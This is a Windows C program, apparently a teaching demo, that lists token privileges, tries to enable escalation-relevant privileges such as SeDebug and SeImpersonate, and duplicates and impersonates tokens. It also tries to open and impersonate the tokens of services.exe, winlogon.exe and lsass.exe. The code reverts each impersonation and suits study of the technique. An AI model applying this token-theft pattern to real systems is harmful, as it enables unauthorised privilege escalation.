#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")

// Function to print error messages.
void PrintError(LPTSTR lpszFunction)
{
    LPVOID lpMsgBuf;
    DWORD dw = GetLastError();
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // default system language.
        (LPTSTR) &lpMsgBuf,
        0, NULL);
    _tprintf(TEXT("[ERROR] %s failed with error %d: %s\n"),
             lpszFunction, dw, (LPCTSTR)lpMsgBuf);
    LocalFree(lpMsgBuf);
}
// Function to enable a specific privilege
BOOL EnablePrivilege(LPCTSTR privilegeName, BOOL enable)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    // Open the process token.
    if (!OpenProcessToken(GetCurrentProcess(),
                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                         &hToken)) {
        PrintError(TEXT("OpenProcessToken"));
        return FALSE;
    }

    // Lookup the LUID for the privilege
    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        PrintError(TEXT("LookupPrivilegeValue"));
        CloseHandle(hToken);
        return FALSE;
    }
    // Set up the token privileges structure.
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
    // Adjust the token privilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
                              NULL, NULL)) {
        PrintError(TEXT("AdjustTokenPrivileges"));
        CloseHandle(hToken);
        return FALSE;
    }
    // Check if privilege was actually adjusted
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        _tprintf(TEXT("[WARNING] The token does not have the %s privilege\n"), privilegeName);
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);
    return TRUE;
}
// Function to get current user and privilege information
void GetCurrentTokenInfo()
{
    HANDLE hToken;
    DWORD dwLengthNeeded;
    PTOKEN_USER pTokenUser = NULL;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    SID_NAME_USE sidType;
    TCHAR szUser[256], szDomain[256];
    DWORD dwUserSize = 256, dwDomainSize = 256;
    // Open the process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        PrintError(TEXT("OpenProcessToken"));
        return;
    }
    // Get token user information
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLengthNeeded) &&
        GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
       
        pTokenUser = (PTOKEN_USER)malloc(dwLengthNeeded);
        if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser,
                                            dwLengthNeeded, &dwLengthNeeded)) {
           
            // Lookup the account name
            if (LookupAccountSid(NULL, pTokenUser->User.Sid, szUser, &dwUserSize,
                                szDomain, &dwDomainSize, &sidType)) {
                _tprintf(TEXT("[INFO] Current User: %s\\%s\n"), szDomain, szUser);
            }
        }
    }
    // Get token privileges
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwLengthNeeded) &&
        GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
       
        pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwLengthNeeded);
        if (pTokenPrivileges && GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges,
                                                  dwLengthNeeded, &dwLengthNeeded)) {
           
            _tprintf(TEXT("[INFO] Current Token Privileges:\n"));
            for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
                TCHAR szPrivilegeName[256];
                DWORD dwNameSize = 256;
               
                if (LookupPrivilegeName(NULL, &pTokenPrivileges->Privileges[i].Luid,
                                      szPrivilegeName, &dwNameSize)) {
                   
                    _tprintf(TEXT(" %s: %s\n"), szPrivilegeName,
                             (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ?
                             TEXT("Enabled") : TEXT("Disabled"));
                }
            }
        }
    }
    // Cleanup
    if (pTokenUser) free(pTokenUser);
    if (pTokenPrivileges) free(pTokenPrivileges);
    CloseHandle(hToken);
}

// Function to demonstrate ImpersonateLoggedOnUser with a system process
BOOL DemonstrateSystemImpersonation()
{
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    BOOL bResult = FALSE;
    PROCESSENTRY32 pe32 = {0};
    _tprintf(TEXT("\n[+] Attempting System Process Impersonation\n"));
    // Create a snapshot of all processes
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        PrintError(TEXT("CreateToolhelp32Snapshot"));
        return FALSE;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    // Find a system process (like services.exe or winlogon.exe)
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            // Look for system processes that typically have good tokens
            if (_tcsicmp(pe32.szExeFile, TEXT("services.exe")) == 0 ||
                _tcsicmp(pe32.szExeFile, TEXT("winlogon.exe")) == 0 ||
                _tcsicmp(pe32.szExeFile, TEXT("lsass.exe")) == 0) {
               
                _tprintf(TEXT("[INFO] Found system process: %s (PID: %d)\n"),
                         pe32.szExeFile, pe32.th32ProcessID);
                // Try to open the process
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    // Try to open the process token
                    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE |
                                        TOKEN_QUERY, &hToken)) {
                       
                        _tprintf(TEXT("[SUCCESS] Opened token from %s\n"), pe32.szExeFile);
                        bResult = TRUE;
                        break;
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    if (hProcessSnap) CloseHandle(hProcessSnap);
    if (!bResult) {
        _tprintf(TEXT("[INFO] Could not access system process tokens. Trying current process token.\n"));
       
        // Fallback: Use current process token for demonstration
        if (OpenProcessToken(GetCurrentProcess(),
                           TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                           &hToken)) {
            bResult = TRUE;
        }
    }
    if (bResult && hToken) {
        // Demonstrate impersonation
        _tprintf(TEXT("[INFO] Attempting impersonation...\n"));
       
        if (ImpersonateLoggedOnUser(hToken)) {
            _tprintf(TEXT("[SUCCESS] ImpersonateLoggedOnUser succeeded!\n"));
           
            // Show current thread token information after impersonation.
            HANDLE hThreadToken;
            if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
                _tprintf(TEXT("[INFO] Successfully opened thread token after impersonation\n"));
                CloseHandle(hThreadToken);
            }
           
            // Revert to self
            RevertToSelf();
            _tprintf(TEXT("[INFO] Reverted to original security context\n"));
        } else {
            PrintError(TEXT("ImpersonateLoggedOnUser"));
        }
       
        CloseHandle(hToken);
    }
    return bResult;
}

// Function to demonstrate privilege escalation scenario.
BOOL DemonstratePrivilegeEscalation()
{
    _tprintf(TEXT("\n[+] Privilege Escalation Scenario\n"));
    // Common privileges used in escalation
    LPCTSTR privileges[] = {
        SE_DEBUG_NAME, // Debug programs.
        SE_TCB_NAME, // Act as part of the OS.
        SE_TAKE_OWNERSHIP_NAME, // Take ownership.
        SE_BACKUP_NAME, // Backup files and directories
        SE_RESTORE_NAME, // Restore files and directories
        SE_IMPERSONATE_NAME, // Impersonate a client after authentication
        SE_ASSIGNPRIMARYTOKEN_NAME, // Assign primary token
        SE_INCREASE_QUOTA_NAME, // Increase quotas
        SE_SECURITY_NAME // Manage auditing and security log.
    };
    int privilegeCount = sizeof(privileges) / sizeof(privileges[0]);
    _tprintf(TEXT("[INFO] Checking available privileges:\n"));
    for (int i = 0; i < privilegeCount; i++) {
        if (EnablePrivilege(privileges[i], TRUE)) {
            _tprintf(TEXT(" [ENABLED] %s\n"), privileges[i]);
            // Disable it after checking
            EnablePrivilege(privileges[i], FALSE);
        } else {
            _tprintf(TEXT(" [UNAVAILABLE] %s\n"), privileges[i]);
        }
    }
    return TRUE;
}

// Function to demonstrate token duplication and impersonation
BOOL DemonstrateTokenDuplication()
{
    HANDLE hToken = NULL;
    HANDLE hDuplicatedToken = NULL;
    BOOL bResult = FALSE;
    _tprintf(TEXT("\n[+] Token Duplication and Impersonation\n"));
    // Get current process token
    if (!OpenProcessToken(GetCurrentProcess(),
                         TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                         &hToken)) {
        PrintError(TEXT("OpenProcessToken"));
        return FALSE;
    }
    // Duplicate the token
    if (!DuplicateTokenEx(hToken,
                         MAXIMUM_ALLOWED,
                         NULL,
                         SecurityImpersonation,
                         TokenImpersonation,
                         &hDuplicatedToken)) {
        PrintError(TEXT("DuplicateTokenEx"));
        CloseHandle(hToken);
        return FALSE;
    }
    _tprintf(TEXT("[SUCCESS] Token duplicated successfully\n"));
    // Impersonate using the duplicated token
    if (ImpersonateLoggedOnUser(hDuplicatedToken)) {
        _tprintf(TEXT("[SUCCESS] Impersonated using duplicated token\n"));
       
        // Perform actions as the impersonated user
        _tprintf(TEXT("[INFO] Performing operations with impersonated token...\n"));
       
        // Example: Try to get thread token information
        HANDLE hThreadToken;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
            _tprintf(TEXT("[INFO] Successfully accessed thread token during impersonation\n"));
           
            // Check token type
            TOKEN_TYPE tokenType;
            DWORD dwLength;
            if (GetTokenInformation(hThreadToken, TokenType, &tokenType,
                                  sizeof(tokenType), &dwLength)) {
                _tprintf(TEXT("[INFO] Token Type: %s\n"),
                         tokenType == TokenPrimary ? TEXT("Primary") : TEXT("Impersonation"));
            }
           
            CloseHandle(hThreadToken);
        }
       
        // Revert back to original context
        RevertToSelf();
        _tprintf(TEXT("[INFO] Reverted to original security context\n"));
       
        bResult = TRUE;
    } else {
        PrintError(TEXT("ImpersonateLoggedOnUser"));
    }
    // Cleanup
    if (hDuplicatedToken) CloseHandle(hDuplicatedToken);
    if (hToken) CloseHandle(hToken);
    return bResult;
}

// Function to demonstrate security context differences
void DemonstrateSecurityContext()
{
    _tprintf(TEXT("\n[+] Security Context Analysis\n"));
    HANDLE hProcessToken, hThreadToken;
    TCHAR szProcessUser[256], szThreadUser[256];
    TCHAR szProcessDomain[256], szThreadDomain[256];
    DWORD dwSize;
    // Get process token user
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hProcessToken)) {
        dwSize = 256;
        if (GetUserName(szProcessUser, &dwSize)) {
            _tprintf(TEXT("[INFO] Process User: %s\n"), szProcessUser);
        }
        CloseHandle(hProcessToken);
    }
    // Get thread token user (if impersonating)
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hThreadToken)) {
        dwSize = 256;
        if (GetUserName(szThreadUser, &dwSize)) {
            _tprintf(TEXT("[INFO] Thread User: %s (Impersonating)\n"), szThreadUser);
        } else {
            _tprintf(TEXT("[INFO] Thread is not impersonating (using process token)\n"));
        }
        CloseHandle(hThreadToken);
    } else {
        DWORD dwError = GetLastError();
        if (dwError == ERROR_NO_TOKEN) {
            _tprintf(TEXT("[INFO] Thread has no token (using process token)\n"));
        }
    }
}
int _tmain(int argc, _TCHAR* argv[])
{
    _tprintf(TEXT("\n[+] Token Manipulation & Privilege Escalation Demonstration\n"));
    // Display current token information
    _tprintf(TEXT("[1] Current Security Context\n"));
    GetCurrentTokenInfo();

    // Demonstrate security context
    DemonstrateSecurityContext();

    // Demonstrate privilege escalation
    DemonstratePrivilegeEscalation();

    // Demonstrate token duplication
    DemonstrateTokenDuplication();
    // Demonstrate system impersonation
    DemonstrateSystemImpersonation();


    _tprintf(TEXT("\n[FINISHED] Demonstration Complete.\n"));
    _tprintf(TEXT("\nPress Enter to exit..."));
    _gettchar();
    
    return 0;
}